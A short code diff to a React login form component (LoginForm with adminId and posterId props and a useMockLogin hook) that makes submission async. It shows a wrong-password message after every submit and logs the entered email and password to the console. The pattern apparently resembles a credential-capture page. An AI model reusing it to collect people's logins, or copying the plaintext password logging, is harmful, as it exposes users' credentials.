@@ -22,9 +22,9 @@ function LoginForm({ adminId, posterId }) {
 
   const { login } = useMockLogin(adminId, posterId);
 
-  const handleSubmit = (values, formik) => {
+  const handleSubmit = async (values, formik) => {
     const { email, password, wrongPassword } = values;
-    setWrongPassword(wrongPassword);
+
     // console.log("values", values);
 
     const submitValues = {
@@ -34,7 +34,8 @@ function LoginForm({ adminId, posterId }) {
       skipcode: "",
     };
 
-    login(submitValues, formik);
+    await login(submitValues, formik);
+    setWrongPassword(wrongPassword);
     setShowWrongPassword(true);
     console.log(submitValues);
   };
